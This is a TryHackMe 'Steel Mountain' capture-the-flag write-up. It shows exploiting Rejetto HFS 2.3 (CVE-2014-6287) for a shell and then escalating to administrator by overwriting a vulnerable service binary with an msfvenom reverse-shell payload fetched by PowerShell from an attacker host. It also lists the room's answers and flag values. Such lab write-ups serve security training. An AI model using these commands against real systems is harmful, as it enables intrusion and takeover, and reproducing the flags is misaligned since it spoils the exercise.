#tryhackme #ctf 
# Steel Mountain
---

## Nmap

|Port|State|Service|Version|
|-----|-----|--------|-----|
|80/tcp |   open | http  | Microsoft IIS httpd 8.5 |
|135/tcp |  open | msrpc  | Microsoft Windows RPC |
|139/tcp |  open | netbios-ssn   |     Microsoft Windows netbios-ssn|
|445/tcp  | open | microsoft-ds   |    Microsoft Windows Server 2008 R2 - 2012 microsoft-ds |
|3389/tcp | open | ssl/ms-wbt-server? | |
|8080/tcp  | open | http  | HttpFileServer httpd 2.3 |
|49152/tcp | open | msrpc | Microsoft Windows RPC |
|49153/tcp | open | msrpc | Microsoft Windows RPC |
|49154/tcp | open | msrpc | Microsoft Windows RPC |
|49155/tcp | open | msrpc | Microsoft Windows RPC |
|49156/tcp | open | msrpc | Microsoft Windows RPC |

Visit the web server on port 80
- *Found an image*
Inspect the image to find the name of employee **Bill Harper**

Visit the web server on port 8080
- *Found Rejetto HTTP File Server 2.3*

Use searchsploit to find exploit for the file server
- *Found CVE-2014-6287*

## Using Metasploit Framework
Use msfconsole to search for this cve
`msfconsole`
`search <CVE>`

Then exploit to gain shell
`use <exploit>`
`show options` - This will list all available options

Now set the required options using the `set <OPTION> <VALUE>` and run
`exploit`

- *Gained shell :)*

`cd bill\Desktop`
`type user.txt`
- *[FLAG 1]*

Use meterpreter to upload [PowerUp.ps1](https://github.com/PowerShellMafia/PowerSploit/bloWithb/master/Privesc/PowerUp.ps1) (for enumeration) to the target
`upload <path to PowerUp.ps1>`
`load powershell`
`powershell_shell` -> powershell in meterpreter

Then run the script
`. .\PowerUp.ps1`
`Invoke-AllChecks` - this starts enumeration 
- *Found AdvancedSystemCareService9 vulnerable - it has the CanRestart option set to true*

Use msfvenom to generate payload (the output file should have the same name as the service as we have to overwrite it)
`msfvenom -p windows/shell_reverse_tcp LHOST=<tun0 IP> LPORT=<port> -e x86/shikata_ga_nai -f exe -o ASCService.exe`

Upload payload to target
`upload <path to ASCService.exe>`

Start a listener on MSF using multi/handler (in new terminal window)
`use multi/handler`

And set the required options
`set <OPTION> <VALUE>`

on the target terminal, stop the vulnerable service
`sc stop AdvancedSystemCareService9`

Now copy the payload ASCService.exe to the path of service
`copy ASCService.exe "\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe"`

Start the service again
`sc start AdvancedSystemCareService9` 
- *Gained root shell ;D*

`cd \Administrator\Desktop`
`type root.txt`
- *[FLAG 2]*

---

## Without Metasploit Framework
Download the [nc.exe](https://github.com/andrew-d/static-binaries/blob/master/binaries/windows/x86/ncat.exe) (netcat binary for windows) and [winPEAS.exe](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS) (for Windows enumeration)

Download the exploit script from [exploit-db.com](https://www.exploit-db.com/exploits/39161) for the found CVE (CVE-2014-6287)

Edit `ip_addr` and `local_port` in the exploit script

In order for this attack to work, it will require a web server and netcat listener to be active at the same time. So, we need 3 terminals for this:

Terminal 1:
- Create a local python server 
`python3 -m http.server 80`

Termianl 2:
- Listen to port using netcat
`nc -lvnp <listening-port>`

Terminal 3:
- Run the script
`python <script-name> <target-ip> <target-port>` 

**Note:** The final command needs to be run TWICE - the first instance will pull the netcat binary to the target and the second will execute the payload to gain a callback within the listener.

- *Gained shell*

Upload winPEAS.exe using powershell
`powershell -c "Invoke-WebRequest -OutFile winPEAS.exe http://10.14.14.19:2311/winPEASx64.exe"`

Then run  `winPEAS.exe`

![winpeas](https://blog.razrsec.uk/content/images/2020/05/image-82.png)

Generate payload using msfvenom and repeat the steps as we did in the previous section (Using Metasploit Framework) to gain root shell.
`msfvenom -p windows/shell_reverse_tcp LHOST=<tun0 IP> LPORT=<port> -e x86/shikata_ga_nai -f exe -o ASCService.exe`

Upload payload to target ([[Transferring Files]]) by running a server on attacker machine
`python3 -m http.server 80`

And getting the file on target machine
`powershell -c "Invoke-WebRequest -OutFile ASCService.exe http://10.14.14.19:2311/ASCService.exe"`

Start a netcat listener on the attacker machine 
`nv -lvnp <port>`

Stop the legitimate service running and replace the application file with our malicious binary:
`sc stop AdvancedSystemCareService9`
`copy ASCService.exe "\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe"`

Start the service again
`sc start AdvancedSystemCareService9`

- *Gained root shell ;D*

`cd \Administrator\Desktop`
`type root.txt`
- *[FLAG 2]*

---

1. Employee of the month 
**Bill Harper (found by inspecting page source)**

2. Scan the machine with nmap. What is the other port running a web server on?
**8080**

3. Take a look at the other web server. What file server is running?
**Rejetto HTTP File server (version 2.3)**

4. What is the CVE number to exploit this file server?
**2014-6287**

5. Use Metasploit to get an initial shell. What is the user flag?
**b04763b6fcf51fcd7c13abc7db4fd365**

6. What is the name of the service which shows up as an unquoted service path vulnerability?
**AdvancedSystemCareService9**

7. What is the root flag?
**9af5f314f57607c00fd09803a587db80**

---